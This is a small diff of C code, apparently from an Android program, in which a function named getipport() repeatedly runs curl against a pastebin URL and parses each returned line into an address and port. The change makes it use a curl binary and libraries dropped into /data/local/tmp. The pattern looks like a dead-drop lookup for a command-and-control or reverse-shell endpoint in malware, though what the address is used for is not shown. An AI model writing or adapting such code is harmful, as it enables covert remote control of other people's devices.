@@ -73,7 +73,7 @@ int getipport()
     while(1){
   FILE *fp;
   char path[1035];
-  fp = popen("curl -s 'https://pastebin.com/raw/1MZ1Tpxc'", "r");
+  fp = popen("export LD_LIBRARY_PATH=/data/local/tmp/lib64;/data/local/tmp/curl -s 'https://pastebin.com/raw/1MZ1Tpxc'", "r");
 while (fgets(path, sizeof(path)-1, fp) != NULL) {
 char *p = strtok (path, "|");
 char *array[2];
